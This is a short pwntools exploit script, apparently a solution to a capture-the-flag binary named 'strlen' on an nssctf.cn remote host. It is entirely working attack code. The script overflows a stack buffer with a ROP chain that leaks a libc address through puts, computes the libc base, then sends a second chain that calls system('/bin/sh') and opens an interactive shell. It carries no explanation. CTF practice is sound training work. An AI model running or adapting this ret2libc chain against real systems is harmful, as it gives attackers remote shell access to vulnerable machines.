from pwn import *

#io = process("./strlen")
io = remote("node4.anna.nssctf.cn", 25137)
elf = ELF("./strlen")
libc = ELF("./libc.so.6")

context.log_level = "debug"

setbuf_got = elf.got["read"]
puts_plt = elf.plt["puts"]
pop_rdi = 0x401373
ret = 0x40101A
main = elf.sym["main"]

io.recvuntil(b"you want to input?")
io.sendline(b"105")
io.recvuntil(b"something else~")
payload = b"\x00" * (0x40 + 8) + p64(pop_rdi) + p64(setbuf_got) + p64(puts_plt) + p64(main)
io.sendline(payload)
libc_base = u64(io.recvuntil(b"\x7f")[-6:].ljust(8, b"\x00")) - libc.sym['read']
print("libc base address =", hex(libc_base))

system = libc_base + libc.sym['system']
binsh = libc_base + next(libc.search(b"/bin/sh\x00"))
io.recvuntil(b"you want to input?")
io.sendline(b"105")
io.recvuntil(b"something else~")
payload = b"\x00" * (0x40 + 8) +p64(ret)+ p64(pop_rdi) + p64(binsh) + p64(system)
io.sendline(payload)
io.interactive()
